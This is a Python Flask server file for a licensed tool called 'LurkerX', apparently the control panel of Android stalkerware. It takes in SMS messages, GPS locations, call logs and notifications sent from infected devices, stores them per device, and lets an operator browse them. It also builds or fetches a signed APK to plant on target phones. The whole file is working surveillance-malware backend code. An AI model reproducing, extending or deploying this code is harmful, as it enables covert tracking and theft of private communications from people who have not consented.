# contacts, tiktok, 
from flask import Flask, request, jsonify, render_template, send_file, session, make_response, redirect, url_for
from pathlib import Path
import os
import io
import shutil
import traceback
import subprocess
import threading
import re
import zipfile
import tempfile
import requests
from datetime import datetime, timezone
import traceback

from server.database import safe_device_name, get_device_db, insert_data, query_data, get_log_structure, get_device_dates, query_data_by_date
from validation import decrypt_token, decode_token
from packager.config import load_ini


APK_PATH = Path(__file__).resolve().parent.parent / "result" / "final_signed.apk"
BUILD_STATUS_PATH = Path(__file__).resolve().parent.parent / "result" / ".build_status"
build_lock = threading.Lock()
build_process = None
build_error = None


def _token_expiry_seconds(token_encrypted: str) -> int | None:
    try:
        decrypted = decrypt_token(token_encrypted)
        if not decrypted:
            return None
        info = decode_token(decrypted, expected_tool="LurkerX")
        if not info.get("valid"):
            return None
        expiry_str = info.get("expires")
        if not expiry_str:
            return None
        expiry_dt = datetime.strptime(expiry_str, "%Y-%m-%d").replace(tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        delta = (expiry_dt - now).total_seconds()
        return max(int(delta), 0)
    except Exception:
        return None


def _set_build_status(status: str, error: str = "", source: str = ""):
    try:
        BUILD_STATUS_PATH.parent.mkdir(parents=True, exist_ok=True)
        BUILD_STATUS_PATH.write_text(f"{status}\n{error}\n{source}", encoding="utf-8")
    except Exception:
        pass


def _get_build_status() -> dict:
    try:
        if BUILD_STATUS_PATH.exists():
            lines = BUILD_STATUS_PATH.read_text(encoding="utf-8").strip().splitlines()
            status = lines[0] if lines else "idle"
            error = lines[1] if len(lines) > 1 else ""
            source = lines[2] if len(lines) > 2 else ""
            return {"status": status, "error": error, "source": source}
    except Exception:
        pass
    return {"status": "idle", "error": "", "source": ""}


def create_app(base_dir: Path) -> Flask:
    global build_process, build_error

    app = Flask(__name__, template_folder="../templates", static_folder="../static", static_url_path="/static")
    app.secret_key = os.environ.get("LURKERX_SECRET_KEY", os.urandom(24))

    PROTECTED_PREFIXES = ("/", "/get_info/", "/build_status")
    PUBLIC_PREFIXES = ("/validate_token", "/logout", "/receive_data/", "/static/", "/download_apk", "/build_apk", "/download_generated_app")

    @app.before_request
    def require_auth():
        path = request.path
        if any(path == p or path.startswith(p) for p in PUBLIC_PREFIXES):
            return None
        if any(path == p or path.startswith(p) for p in PROTECTED_PREFIXES):
            if not session.get("token_valid"):
                if request.path.startswith("/api/"):
                    return jsonify({"error": "Unauthorized"}), 401
                return render_template("base.html", structure={}, unauthorized=True)
        return None

    @app.route("/validate_token", methods=["POST"])
    def validate_token():
        try:
            data = request.get_json(silent=True) or request.form
            token = data.get("token") if hasattr(data, "get") else (data.get("token") if isinstance(data, dict) else None)
            if not token:
                return jsonify({"error": "Token required"}), 400

            token_server_url = os.environ.get("TOKEN_SERVER_URL", "http://localhost:8080").rstrip("/")
            if not token_server_url:
                return jsonify({"error": "Server misconfigured: TOKEN_SERVER_URL missing"}), 500

            ini = load_ini(Path(__file__).resolve().parent.parent / "choices.ini")
            remote_url = ini.get("behavior", "remote_url", fallback=request.host_url)

            try:
                resp = requests.post(
                    f"{token_server_url}/api/v1/token/validate",
                    json={"token": token, "tool": "LurkerX", "remote_url": remote_url},
                    timeout=15,
                )
            except requests.RequestException as exc:
                print(f"[validate_token] validator unreachable: {exc}")
                traceback.print_exc()
                return jsonify({"error": "Validator unreachable"}), 502

            try:
                payload = resp.json()
            except Exception:
                return jsonify({"error": "Invalid validator response"}), 502

            if resp.status_code != 200 or not payload.get("valid"):
                reason = payload.get("error") or payload.get("message") or "Invalid or expired token"
                return jsonify({"error": reason}), 401

            session["token_valid"] = True
            max_age = _token_expiry_seconds(token) or (60 * 60 * 24 * 30)
            result = make_response(jsonify({"status": "ok"}))
            result.set_cookie("lurkerx_token", token, max_age=max_age, httponly=True, samesite="Lax")
            return result
        except Exception as e:
            return jsonify({"error": f"Server error: {e}"}), 500

    @app.route("/logout", methods=["POST"])
    def logout():
        session.pop("token_valid", None)
        resp = make_response(jsonify({"status": "ok"}))
        resp.set_cookie("lurkerx_token", "", expires=0)
        return resp

    @app.route("/receive_data/<item>", methods=["POST"])
    def receive_data(item):
        device_model = request.headers.get("C-Device")
        if not device_model:
            return jsonify({"error": "Missing device header"}), 400

        payload = request.get_json(silent=True)
        if not payload:
            return jsonify({"error": "Invalid JSON payload"}), 400

        messages = payload if isinstance(payload, list) else payload.get("messages")
        if not isinstance(messages, list):
            return jsonify({"error": "Invalid payload structure"}), 400

        device_name = safe_device_name(device_model)
        try:
            conn = get_device_db(device_name, base_dir)
            inserted, skipped = insert_data(conn, item, messages)
            conn.close()
        except Exception as e:
            return jsonify({"error": f"Database error: {e}"}), 500

        return jsonify({
            "status": "ok",
            "device": device_name,
            "item": item,
            "inserted": inserted,
            "skipped": skipped
        })

    @app.route("/get_info/<info_type>", methods=["GET"])
    def get_info(info_type):
        device_model = request.headers.get("C-Device")
        if not device_model:
            return jsonify({"error": "Missing device header"}), 400

        date = request.args.get("date")
        device_name = safe_device_name(device_model)
        try:
            conn = get_device_db(device_name, base_dir)
            data = query_data_by_date(conn, info_type, date)
            conn.close()
        except Exception as e:
            print(f"[ERROR] get_info failed: device={device_name} type={info_type} date={date} error={e}")
            return jsonify({"error": f"Database error: {e}"}), 500

        print(f"[DEBUG] get_info: device={device_name} type={info_type} date={date} count={len(data)}")
        return jsonify({"device": device_name, "type": info_type, "count": len(data), "data": data})

    @app.route("/build_status")
    def build_status():
        status = _get_build_status()
        done = APK_PATH.exists() and APK_PATH.stat().st_size > 0
        status["apk_exists"] = done
        return jsonify(status)

    @app.route("/build_apk", methods=["POST"])
    def build_apk():
        global build_process, build_error

        with build_lock:
            if build_process and build_process.poll() is None:
                return jsonify({"status": "building", "message": "Build already in progress"}), 429

            _set_build_status("building", source="docker")
            build_error = None

            try:
                print("[build_apk] starting packager subprocess")
                build_process = subprocess.Popen(
                    ["python", "-m", "packager"],
                    cwd=str(Path(__file__).resolve().parent.parent),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )
            except Exception as e:
                print(f"[build_apk] failed to start: {e}")
                _set_build_status("error", str(e), source="docker")
                build_error = str(e)
                return jsonify({"status": "error", "error": str(e)}), 500

            def wait_for_build():
                global build_process, build_error
                try:
                    stdout, _ = build_process.communicate()
                    print(f"[build_apk] process finished rc={build_process.returncode}")
                    if build_process.returncode == 0:
                        print("[build_apk] build succeeded")
                        _set_build_status("done", source="docker")
                    else:
                        err_msg = stdout.strip()[-500:] if stdout else "Build failed"
                        print(f"[build_apk] build failed: {err_msg}")
                        _set_build_status("error", err_msg, source="docker")
                        build_error = err_msg
                except Exception as e:
                    print(f"[build_apk] exception: {e}")
                    _set_build_status("error", str(e), source="docker")
                    build_error = str(e)
                finally:
                    build_process = None

            threading.Thread(target=wait_for_build, daemon=True).start()
            return jsonify({"status": "building", "message": "APK build started"}), 202

    @app.route("/logs/<path:filename>", methods=["GET"])
    def logs(filename):
        parts = filename.split("/")
        if len(parts) < 4:
            return jsonify({"error": "Invalid log path"}), 400
        device_name = safe_device_name(parts[0])
        info_type = parts[-1]
        TABLES = {"sms": "date", "gps": "timestamp", "calls": "timestamp", "notifs": "timestamp"}
        if info_type not in TABLES:
            return jsonify({"error": "Invalid info type"}), 400
        try:
            conn = get_device_db(device_name, base_dir)
            rows = query_data(conn, info_type, None)
            conn.close()
        except Exception as e:
            return jsonify({"error": f"Database error: {e}"}), 500
        return jsonify({info_type: rows})

    @app.route("/api/devices", methods=["GET"])
    def api_devices():
        try:
            structure = get_log_structure(base_dir)
            devices = list(structure.keys())
            return jsonify({"devices": devices})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route("/api/devices/<device>/dates", methods=["GET"])
    def api_device_dates(device):
        device_name = safe_device_name(device)
        try:
            dates = get_device_dates(base_dir, device_name)
            return jsonify({"device": device_name, "dates": dates})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route("/download_apk", methods=["GET"])
    def download_apk():
        if not APK_PATH.exists():
            return jsonify({"error": "APK not built yet"}), 404
        return send_file(str(APK_PATH), as_attachment=True, download_name="final_signed.apk")

    @app.route("/download_generated_app", methods=["POST"])
    def download_generated_app():
        print("[download_generated_app] hit")
        try:
            data = request.get_json(silent=True) or request.form
            repo_url = data.get("repo_url") if hasattr(data, "get") else (data.get("repo_url") if isinstance(data, dict) else None)

            if not repo_url:
                ini = load_ini(Path(__file__).resolve().parent.parent / "choices.ini")
                repo_url = ini.get("behavior", "repo_url", fallback=None)
                print(f"[download_generated_app] using default repo_url from choices.ini: {repo_url}")

            if not repo_url:
                return jsonify({"error": "repo_url is required. Set [behavior] repo_url in choices.ini"}), 400

            repo_url = repo_url.strip().rstrip("/")
            print("Repo URL:", repo_url)
            m = re.match(r"https?://github\.com/([^/]+)/([^/]+)", repo_url)
            if not m:
                return jsonify({"error": "Invalid GitHub repo URL"}), 400

            owner = m.group(1)
            repo = m.group(2)
            print(f"[download_generated_app] owner={owner} repo={repo}")

            _set_build_status("building", source="github")
            print("[download_generated_app] build_status set to building")

            artifact_url = None
            for branch in ["main", "master"]:
                url = f"https://nightly.link/{owner}/{repo}/workflows/build-apk/{branch}/app.zip"
                print(f"[download_generated_app] trying {url}")
                try:
                    r = requests.get(url, stream=True, timeout=60, allow_redirects=True)
                    print(f"[download_generated_app] status={r.status_code}")
                    if r.status_code == 200:
                        artifact_url = url
                        break
                except requests.RequestException as e:
                    print(f"[download_generated_app] request failed: {e}")
                    continue

            if not artifact_url:
                _set_build_status("error", "No CI build artifact found for this fork on main/master", source="github")
                return jsonify({"error": "No CI build artifact found for this fork on main/master"}), 404

            print(f"[download_generated_app] downloading {artifact_url}")
            with tempfile.TemporaryDirectory() as tmpdir:
                zip_path = Path(tmpdir) / "app.zip"
                with requests.get(artifact_url, stream=True, timeout=60) as r:
                    r.raise_for_status()
                    with open(zip_path, "wb") as f:
                        for chunk in r.iter_content(chunk_size=8192):
                            if chunk:
                                f.write(chunk)

                apk_path = None
                with zipfile.ZipFile(zip_path, "r") as zf:
                    for name in zf.namelist():
                        if name.endswith(".apk"):
                            apk_path = Path(tmpdir) / Path(name).name
                            with open(apk_path, "wb") as f:
                                f.write(zf.read(name))
                            break

                if not apk_path or not apk_path.exists():
                    return jsonify({"error": "app.zip did not contain an APK"}), 422

                APK_PATH.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(apk_path, APK_PATH)
                print(f"[download_generated_app] saved APK to {APK_PATH}")

            _set_build_status("done", source="github")
            print("[download_generated_app] build_status set to done")
            return jsonify({"status": "done"})
        except requests.RequestException as e:
            print(f"[download_generated_app] network error: {e}")
            return jsonify({"error": f"Download failed: {e}"}), 502
        except Exception as e:
            traceback.print_exc()
            return jsonify({"error": str(e)}), 500

    @app.route("/")
    def index():
        try:
            structure = get_log_structure(base_dir)
            return render_template("base.html", structure=structure, unauthorized=False)
        except Exception:
            traceback.print_exc()
            return "Error loading panel.", 500

    @app.errorhandler(404)
    def not_found(e):
        return jsonify({"error": "Not found"}), 404

    @app.errorhandler(500)
    def server_error(e):
        return jsonify({"error": "Internal server error"}), 500

    return app
